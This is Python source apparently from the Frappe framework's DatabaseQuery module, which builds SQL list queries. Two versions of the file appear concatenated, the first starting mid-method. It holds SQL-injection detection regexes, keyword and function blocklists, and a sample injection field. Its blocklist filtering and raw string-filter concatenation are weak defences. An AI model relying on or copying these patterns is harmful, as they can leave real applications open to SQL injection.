		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',                    
			'from', 'group', 'order', 'by']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)                    

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

